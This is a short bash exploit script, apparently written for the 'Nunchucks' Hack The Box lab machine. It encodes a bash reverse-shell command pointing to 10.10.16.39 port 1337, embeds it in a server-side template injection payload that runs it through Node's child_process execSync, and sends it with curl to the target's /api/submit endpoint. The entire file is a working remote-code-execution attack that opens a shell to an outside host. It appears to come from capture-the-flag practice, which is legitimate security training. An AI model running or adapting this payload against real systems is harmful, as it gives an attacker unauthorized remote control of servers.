#!/bin/bash

#cmd=$1
cmd="bash -i >& /dev/tcp/10.10.16.39/1337 0>&1"

cmd64=$(echo ${cmd} | base64)

ssti="{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('echo ${cmd64} | base64 -d | bash')\\\")()}}"

curl -k \
  -H "Content-Type: application/json" \
  -X POST \
  -d "{\"email\":\"${ssti}\"}" \
  https://store.nunchucks.htb/api/submit
